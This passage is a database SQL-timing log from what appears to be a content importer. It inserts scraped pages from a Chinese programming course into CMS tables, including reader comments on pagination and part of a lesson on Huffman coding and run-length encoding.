</div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/13/db/26/54f2c164.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>靠人品去赢</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-06 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 刚想说重复数据的问题，就提了。 <br>我们遇到情况就是，订单列表无所谓不是第一页，每次到页面触发按钮的时候直接请求最新的数据，量不多可以忽略。 
<br>但是首页的展示或者用的比较频繁就不能，这样看起来很怪，之前虎嗅的网页版具有类似的问题，下拉新的一页和上面的数据有相同的。我们的想法是，拿到前一页的最后一个id，作为参数请求下一页放进去控制。貌似有的分页插件有类似的功能，暂时还没研究。 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: "最后一个 id"，就是文中我说的“数据队列”的方式。</p> </div> <div class="_1w8H0ktn_0 
_2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> </div> <div 
class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> </div> <!----> </div> 
</div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/0f/4d/fd/0aa0e39f.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>许童童</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-06 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0 _3D2NkqD6_0"> 老师这一节讲的第三种方法，数据队列正是我在业务中使用到的，很精妙，很好的解决了问题 </div> 
<!----> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
</div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>leslie</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-06 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 数据库端做limit操作前端页面调用结果集这大概是最方面且最快捷的方式：调用的算法和数据结构同样简单；代价就是资源的消耗。无论是mysql还是sql 
server分页直接通过类似方式用的最多-时间代价相对小，擅长的东西做事擅长的事情。另外一种方式没尝试过。 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i 
class="iconfont"></i> </div> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class=""></span> </div> <!----> </div> </div> </div></li>', 0, 'full_html', 'zh-hans', 
7, 7) 
 {executed in 0 msec}
2020-11-19 11:02:51.689 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=7 
 {executed in 0 msec}
2020-11-19 11:02:51.689 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:02:51.690 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_0_, bookfieldt0_.bundle as bundle2_8_0_, bookfieldt0_.delta 
as delta3_8_0_, bookfieldt0_.langcode as langcode4_8_0_, bookfieldt0_.revision_id as revision5_8_0_, 
bookfieldt0_.field_thumb_value as field_th6_8_0_ from node__field_thumb bookfieldt0_ where 
bookfieldt0_.entity_id=7 
 {executed in 0 msec}
2020-11-19 11:02:51.691 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:02:51.692 INFO  jdbc.sqltiming Line:373 - insert into node__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, entity_id) 
values ('book', 0, 'zh-hans', 7, 'https://static001.geekbang.org/resource/image/3a/ee/3a5782fa96b248a2026a941b4b93a3ee.jpg', 
7) 
 {executed in 1 msec}
2020-11-19 11:02:51.696 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=7 
 {executed in 0 msec}
2020-11-19 11:02:51.696 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:02:51.697 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, 
entity_id) values ('book', 0, 'zh-hans', 7, 'https://static001.geekbang.org/resource/image/3a/ee/3a5782fa96b248a2026a941b4b93a3ee.jpg', 
7) 
 {executed in 0 msec}
2020-11-19 11:02:51.701 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=7 
 {executed in 0 msec}
2020-11-19 11:02:51.702 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:02:51.703 INFO  jdbc.sqltiming Line:373 - insert into node__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 7, 7) 
 {executed in 0 msec}
2020-11-19 11:02:51.707 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=7 
 {executed in 1 msec}
2020-11-19 11:02:51.707 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:02:51.708 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 7, 7) 
 {executed in 0 msec}
2020-11-19 11:03:42.158 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='401917996311560' 
 {executed in 1 msec}
2020-11-19 11:03:42.159 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:03:42.162 INFO  jdbc.sqltiming Line:373 - insert into node_revision (langcode, nid, revision_default, revision_timestamp, revision_uid) 
values ('zh-hans', 0, 1, 1605755022, 1) 
 {executed in 1 msec}
2020-11-19 11:03:42.162 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node_revision (langcode, nid, revision_default, revision_timestamp, 
revision_uid) values ('zh-hans', 0, 1, 1605755022, 1) 
 {executed in 0 msec}
2020-11-19 11:03:42.163 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|8             |
|--------------|

2020-11-19 11:03:42.169 INFO  jdbc.sqltiming Line:373 - insert into node (langcode, type, uuid, vid) values ('zh-hans', 'book', 'd068f315-4a11-435d-9325-c6a3ee89c007', 
8) 
 {executed in 0 msec}
2020-11-19 11:03:42.170 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node (langcode, type, uuid, vid) values ('zh-hans', 
'book', 'd068f315-4a11-435d-9325-c6a3ee89c007', 8) 
 {executed in 0 msec}
2020-11-19 11:03:42.170 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|8             |
|--------------|

2020-11-19 11:03:42.176 INFO  jdbc.sqltiming Line:373 - update node_revision set langcode='zh-hans', nid=8, revision_default=1, revision_timestamp=1605755022, 
revision_uid=1 where vid=8 
 {executed in 0 msec}
2020-11-19 11:03:42.181 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_0_, bookfieldf0_.bundle as bundle2_6_0_, bookfieldf0_.delta 
as delta3_6_0_, bookfieldf0_.field_fsid_value as field_fs4_6_0_, bookfieldf0_.langcode as langcode5_6_0_, 
bookfieldf0_.revision_id as revision6_6_0_ from node__field_fsid bookfieldf0_ where bookfieldf0_.entity_id=8 
 {executed in 0 msec}
2020-11-19 11:03:42.182 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:03:42.183 INFO  jdbc.sqltiming Line:373 - insert into node__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, entity_id) 
values ('book', 0, '401917996311560', 'zh-hans', 8, 8) 
 {executed in 0 msec}
2020-11-19 11:03:42.190 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=8 
 {executed in 0 msec}
2020-11-19 11:03:42.190 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:03:42.192 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, 
entity_id) values ('book', 0, '401917996311560', 'zh-hans', 8, 8) 
 {executed in 0 msec}
2020-11-19 11:03:42.196 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=8 
 {executed in 0 msec}
2020-11-19 11:03:42.197 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:03:42.198 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_0_, bookentity0_.bid as bid2_1_0_, bookentity0_.depth as 
depth3_1_0_, bookentity0_.has_children as has_chil4_1_0_, bookentity0_.p1 as p5_1_0_, bookentity0_.p2 
as p6_1_0_, bookentity0_.p3 as p7_1_0_, bookentity0_.p4 as p8_1_0_, bookentity0_.p5 as p9_1_0_, 
bookentity0_.pid as pid10_1_0_, bookentity0_.weight as weight11_1_0_ from book bookentity0_ 
where bookentity0_.nid=8 
 {executed in 0 msec}
2020-11-19 11:03:42.198 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:03:42.199 INFO  jdbc.sqltiming Line:373 - insert into book (bid, depth, has_children, p1, p2, p3, p4, p5, pid, weight, nid) values (1, 
3, 0, 1, 4, 8, 0, 0, 4, 0, 8) 
 {executed in 0 msec}
2020-11-19 11:03:42.207 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=8 
 {executed in 0 msec}
2020-11-19 11:03:42.208 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:03:42.209 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=8 
 {executed in 0 msec}
2020-11-19 11:03:42.210 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:03:42.219 INFO  jdbc.sqltiming Line:373 - insert into node_revision__body (body_value, body_summary, bundle, delta, body_format, langcode, 
revision_id, entity_id) values ('<div data-slate-editor="true" data-key="560" autocorrect="off" 
spellcheck="false" data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: 
break-word;"> <div class="se-096fe4a1 " data-slate-type="paragraph" data-slate-object="block" 
data-key="561"> <span data-slate-object="text" data-key="562"><span data-slate-leaf="true" 
data-offset-key="562:0" data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> 
</div> <div class="se-59727eb8 " data-slate-type="paragraph" data-slate-object="block" data-key="563"> 
<span data-slate-object="text" data-key="564"><span data-slate-leaf="true" data-offset-key="564:0" 
data-first-offset="true"><span data-slate-string="true">今天，我们来继续学习一些全栈开发中影响深远的算法，我们这次的归类是无损压缩算法。无损压缩，顾名思义就是经过压缩以后，数据的大小降下来了，但是只要经过还原，原始数据是一点都不丢失的。和无损压缩对应的，显然就叫做“有损压缩”了，它们能够做到在牺牲一定程度原数据质量的基础上，比有损压缩获得额外的压缩比。</span></span></span> 
</div> <div class="se-b3c8873d " data-slate-type="paragraph" data-slate-object="block" data-key="565"> 
<span data-slate-object="text" data-key="566"><span data-slate-leaf="true" data-offset-key="566:0" 
data-first-offset="true"><span data-slate-string="true">无损压缩的算法其实有很多，但无论是哪一种，里面都没有多么神奇的把戏，</span></span></span><span 
data-slate-object="text" data-key="567"><span data-slate-leaf="true" data-offset-key="567:0" 
data-first-offset="true"><span class="se-28cbfdab" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">它们的最基本原理都是一致的，就是利用数据的重复性（冗余性）。</span></span></span></span><span data-slate-object="text" 
data-key="568"><span data-slate-leaf="true" data-offset-key="568:0" data-first-offset="true"><span 
data-slate-string="true">在经过某种无损压缩以后，由于数据的重复性已经降下来了，因此再压缩就无法获益了。</span></span></span> </div> 
<h2 class="se-1cdafb61" data-slate-type="heading" data-slate-object="block" data-key="569"><span 
data-slate-object="text" data-key="570"><span data-slate-leaf="true" data-offset-key="570:0" 
data-first-offset="true"><span data-slate-string="true">哈夫曼编码</span></span></span></h2> <div 
class="se-88175b5b " data-slate-type="paragraph" data-slate-object="block" data-key="571"> 
<span data-slate-object="text" data-key="572"><span data-slate-leaf="true" data-offset-key="572:0" 
data-first-offset="true"><span data-slate-string="true">不管是在哪一本系统介绍压缩算法的书中，那么多的无损压缩算法，哈夫曼编码（Huffman 
Coding）基本都是需要我们最先接触学习的那一个。哈夫曼编码从原理上看，它会根据字符的出现频率，来决定使用怎样的编码方式，并且是</span></span></span><span 
data-slate-object="text" data-key="573"><span data-slate-leaf="true" data-offset-key="573:0" 
data-first-offset="true"><span class="se-f525b37c" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">变长编码</span></span></span></span><span data-slate-object="text" data-key="574"><span 
data-slate-leaf="true" data-offset-key="574:0" data-first-offset="true"><span data-slate-string="true">的一种。相应地，程序员熟悉的 
ASCII 码，就是</span></span></span><span data-slate-object="text" data-key="575"><span data-slate-leaf="true" 
data-offset-key="575:0" data-first-offset="true"><span class="se-1e126610" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">定长编码</span></span></span></span><span 
data-slate-object="text" data-key="576"><span data-slate-leaf="true" data-offset-key="576:0" 
data-first-offset="true"><span data-slate-string="true">，因为总共就 128 个字符，不管是哪一个字符，占用的长度都是一样的。</span></span></span> 
</div> <div class="se-1613c089 " data-slate-type="paragraph" data-slate-object="block" data-key="577"> 
<span data-slate-object="text" data-key="578"><span data-slate-leaf="true" data-offset-key="578:0" 
data-first-offset="true"><span data-slate-string="true">下面我们来看一下哈夫曼编码的大致过程：</span></span></span> 
</div> <div class="se-7afabc85 " data-slate-type="paragraph" data-slate-object="block" data-key="579"> 
<span data-slate-object="text" data-key="580"><span data-slate-leaf="true" data-offset-key="580:0" 
data-first-offset="true"><span data-slate-string="true">首先，统计被加密数据中每个字符出现的频率，把它们从高到低排好。比如下面这个表，就是某一段文字的字母出现的次数统计表格，你可以看到这些字母出现的次数是从左到右依次增加的：</span></span></span> 
</div> <div class="se-bacd0439" data-slate-type="image" data-slate-object="block" data-key="581"> 
<img class="se-0dbc6322" src="https://static001.geekbang.org/resource/image/b9/2a/b9cd13863209a33f45974a72f306102a.jpg"> 
</div> <div class="se-0eb3db54 " data-slate-type="paragraph" data-slate-object="block" data-key="582"> 
<span data-slate-object="text" data-key="583"><span data-slate-leaf="true" data-offset-key="583:0" 
data-first-offset="true"><span data-slate-string="true">接下去，我们就可以从表格的左侧开始取数据，并自下而上地构造哈夫曼树了。</span></span></span> 
</div> <div class="se-74bf0277 " data-slate-type="paragraph" data-slate-object="block" data-key="584"> 
<span data-slate-object="text" data-key="585"><span data-slate-leaf="true" data-offset-key="585:0" 
data-first-offset="true"><span data-slate-string="true">我们</span></span></span><span data-slate-object="text" 
data-key="586"><span data-slate-leaf="true" data-offset-key="586:0" data-first-offset="true"><span 
class="se-bce208fa" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">每次只考虑表格中“出现次数”最少的两列</span></span></span></span><span 
data-slate-object="text" data-key="587"><span data-slate-leaf="true" data-offset-key="587:0" 
data-first-offset="true"><span data-slate-string="true">。第一次，我们发现出现次数最少的是字母 h，其次是 f，因此分别构造最底层的两个叶子节点 
h 和 f，并将它们的和 5 + 6 = 11 也求出来，构造成为它们的父节点：</span></span></span> </div> <div class="se-393b9dbb" 
data-slate-type="image" data-slate-object="block" data-key="588"> <img class="se-7d986914" 
src="https://static001.geekbang.org/resource/image/07/25/07ced87b093b15a37a53eec5c11f9525.jpg"> 
</div> <div class="se-fceece2c " data-slate-type="paragraph" data-slate-object="block" data-key="589"> 
<span data-slate-object="text" data-key="590"><span data-slate-leaf="true" data-offset-key="590:0" 
data-first-offset="true"><span data-slate-string="true">同时，我们更新这个统计表格，使用这个父节点去代替它原本的两个节点 h 
和 f，依然保持各列按照出现次数递增排列：</span></span></span> </div> <div class="se-6f63ebd4" data-slate-type="image" 
data-slate-object="block" data-key="591"> <img class="se-874759a7" src="https://static001.geekbang.org/resource/image/bb/c4/bb6ba23b7599906e0947ce3c11c93ac4.jpg"> 
</div> <div class="se-b2b44f01 " data-slate-type="paragraph" data-slate-object="block" data-key="592"> 
<span data-slate-object="text" data-key="593"><span data-slate-leaf="true" data-offset-key="593:0" 
data-first-offset="true"><span data-slate-string="true">继续按照上面的操作，现在值最小的两个节点，分别为 7 和 8，因此现在这张图变成了：</span></span></span> 
</div> <div class="se-9830d8e3" data-slate-type="image" data-slate-object="block" data-key="594"> 
<img class="se-0cc6443d" src="https://static001.geekbang.org/resource/image/9e/23/9e960cccbc377d2aa78de0d1b0261523.jpg"> 
</div> <div class="se-1264cf53 " data-slate-type="paragraph" data-slate-object="block" data-key="595"> 
<span data-slate-object="text" data-key="596"><span data-slate-leaf="true" data-offset-key="596:0" 
data-first-offset="true"><span data-slate-string="true">而表格变成了：</span></span></span> </div> 
<div class="se-77d60ad5" data-slate-type="image" data-slate-object="block" data-key="597"> 
<img class="se-ac54e4fa" src="https://static001.geekbang.org/resource/image/50/78/5030c305d3ec507e98fc9ef2837c7a78.jpg"> 
</div> <div class="se-5eefb000 " data-slate-type="paragraph" data-slate-object="block" data-key="598"> 
<span data-slate-object="text" data-key="599"><span data-slate-leaf="true" data-offset-key="599:0" 
data-first-offset="true"><span data-slate-string="true">继续，现在值最小的两个节点，分别对应 11 和 15：</span></span></span> 
</div> <div class="se-730daf36" data-slate-type="image" data-slate-object="block" data-key="600"> 
<img class="se-ee01dd57" src="https://static001.geekbang.org/resource/image/e9/19/e9bddf90bba68e53fd05f7ba360be419.jpg"> 
</div> <div class="se-f525d9b5 " data-slate-type="paragraph" data-slate-object="block" data-key="601"> 
<span data-slate-object="text" data-key="602"><span data-slate-leaf="true" data-offset-key="602:0" 
data-first-offset="true"><span data-slate-string="true">表格变成了：</span></span></span> </div> 
<div class="se-6028846f" data-slate-type="image" data-slate-object="block" data-key="603"> 
<img class="se-bedd5666" src="https://static001.geekbang.org/resource/image/e8/fa/e81b887b2257301b0550a8287108effa.jpg"> 
</div> <div class="se-a9a246d8 " data-slate-type="paragraph" data-slate-object="block" data-key="604"> 
<span data-slate-object="text" data-key="605"><span data-slate-leaf="true" data-offset-key="605:0" 
data-first-offset="true"><span data-slate-string="true">继续：</span></span></span> </div> <div 
class="se-ae7dc97a" data-slate-type="image" data-slate-object="block" data-key="606"> <img 
class="se-cd93723f" src="https://static001.geekbang.org/resource/image/a5/6d/a570c424cfeb2c166b9b946ff43cba6d.jpg"> 
</div> <div class="se-8ea75479 " data-slate-type="paragraph" data-slate-object="block" data-key="607"> 
<span data-slate-object="text" data-key="608"><span data-slate-leaf="true" data-offset-key="608:0" 
data-first-offset="true"><span data-slate-string="true">表格只有两列数据了：</span></span></span> </div> 
<div class="se-0032bf0e" data-slate-type="image" data-slate-object="block" data-key="609"> 
<img class="se-e20f7146" src="https://static001.geekbang.org/resource/image/20/65/2065dc12222e465cd65e46b31ec6f865.jpg"> 
</div> <div class="se-111d0ae9 " data-slate-type="paragraph" data-slate-object="block" data-key="610"> 
<span data-slate-object="text" data-key="611"><span data-slate-leaf="true" data-offset-key="611:0" 
data-first-offset="true"><span data-slate-string="true">好，这棵树构造完成，这时候表格里只剩下一列了，即 e+a+h+f+t+d=76，我就不列出来了。在树构造完成后，我们给图中所有的左分支赋值 
0，右分支赋值 1：</span></span></span> </div> <div class="se-ebaa6f60" data-slate-type="image" data-slate-object="block" 
data-key="612"> <img class="se-8a4b073b" src="https://static001.geekbang.org/resource/image/23/62/235d7ec15ea7a20981b0283d329c5362.jpg"> 
</div> <div class="se-07ceb242 " data-slate-type="paragraph" data-slate-object="block" data-key="613"> 
<span data-slate-object="text" data-key="614"><span data-slate-leaf="true" data-offset-key="614:0" 
data-first-offset="true"><span data-slate-string="true">这就是哈夫曼树。</span></span></span> </div> 
<div class="se-03c55c19 " data-slate-type="paragraph" data-slate-object="block" data-key="615"> 
<span data-slate-object="text" data-key="616"><span data-slate-leaf="true" data-offset-key="616:0" 
data-first-offset="true"><span data-slate-string="true">你可以看到，每一个叶子节点，都代表了我们希望加密的字符。</span></span></span><span 
data-slate-object="text" data-key="617"><span data-slate-leaf="true" data-offset-key="617:0" 
data-first-offset="true"><span class="se-9a5c0be1" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">只要从根部开始，往叶子节点的方向按照最短路径的方式遍历（图中箭头的逆向），每一条路径都对应了实际的哈夫曼编码。</span></span></span></span><span 
data-slate-object="text" data-key="618"><span data-slate-leaf="true" data-offset-key="618:0" 
data-first-offset="true"><span data-slate-string="true">按照这个规则，让我们给最开始的那个记录字符出现次数的表格加上一行：</span></span></span> 
</div> <div class="se-4088da1f" data-slate-type="image" data-slate-object="block" data-key="619"> 
<img class="se-c7b7514b" src="https://static001.geekbang.org/resource/image/75/77/75437d2a1157a36eba5f81c57c88c077.jpg"> 
</div> <div class="se-b7457751 " data-slate-type="paragraph" data-slate-object="block" data-key="620"> 
<span data-slate-object="text" data-key="621"><span data-slate-leaf="true" data-offset-key="621:0" 
data-first-offset="true"><span data-slate-string="true">你可以看到，大致的规律是，出现频率越高的字符，编码串的长度就越短。如果有一个单词 
date，它的编码就是：</span></span></span> </div> <div class="se-815a6fd8" data-slate-type="image" data-slate-object="block" 
data-key="622"> <img class="se-b97dd0fa" src="https://static001.geekbang.org/resource/image/b3/08/b3e14ecf2d8c67845f8bad9763be8c08.jpg"> 
</div> <div class="se-96f8c5e7 " data-slate-type="paragraph" data-slate-object="block" data-key="623"> 
<span data-slate-object="text" data-key="624"><span data-slate-leaf="true" data-offset-key="624:0" 
data-first-offset="true"><span data-slate-string="true">这就是哈夫曼编码的原理，但是由于哈夫曼编码是变长的，</span></span></span><span 
data-slate-object="text" data-key="625"><span data-slate-leaf="true" data-offset-key="625:0" 
data-first-offset="true"><span class="se-52fac391" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">为了解码端能够准确地解码，就需要编码端同时附上字母到编码的映射关系表</span></span></span></span><span 
data-slate-object="text" data-key="626"><span data-slate-leaf="true" data-offset-key="626:0" 
data-first-offset="true"><span data-slate-string="true">（就是上面那个表格，出现次数一行可以删掉，剩下两行保留），也就是所谓的“编码表”。</span></span></span> 
</div> <h2 class="se-d6030148" data-slate-type="heading" data-slate-object="block" data-key="627"><span 
data-slate-object="text" data-key="628"><span data-slate-leaf="true" data-offset-key="628:0" 
data-first-offset="true"><span data-slate-string="true">RLE 编码</span></span></span></h2> <div 
class="se-0278f466 " data-slate-type="paragraph" data-slate-object="block" data-key="629"> 
<span data-slate-object="text" data-key="630"><span data-slate-leaf="true" data-offset-key="630:0" 
data-first-offset="true"><span data-slate-string="true">RLE 编码，即 Run-Length Encoding，是一种原理非常简单的压缩编码方式，它利用的就是字符的“简单重复”。并且有意思的是，这种编码方式和很多其它压缩编码方式不冲突，也就是说，</span></span></span><span 
data-slate-object="text" data-key="631"><span data-slate-leaf="true" data-offset-key="631:0" 
data-first-offset="true"><span class="se-5dc6d49e" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">数据可以以特定的方式经过 RLE 编码后，再使用哈夫曼等其它方式进一步压缩编码</span></span></span></span><span 
data-slate-object="text" data-key="632"><span data-slate-leaf="true" data-offset-key="632:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> <div 
class="se-8fcdeaaa " data-slate-type="paragraph" data-slate-object="block" data-key="633"> 
<span data-slate-object="text" data-key="634"><span data-slate-leaf="true" data-offset-key="634:0" 
data-first-offset="true"><span data-slate-string="true">举个例子，如果有这样一段单个字符重复率比较高的原串：</span></span></span> 
</div> <div class="se-fc72288f se-5fc72052" data-slate-type="pre" data-slate-object="block" 
data-key="635"> <div class="se-e71945b9 se-566ad990"> <span></span> </div> <div class="se-082e7343"> 
<div class="se-907e558b se-97be4980" data-code-line-number="1"></div> </div> <div class="se-fcf6a9e1 
ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
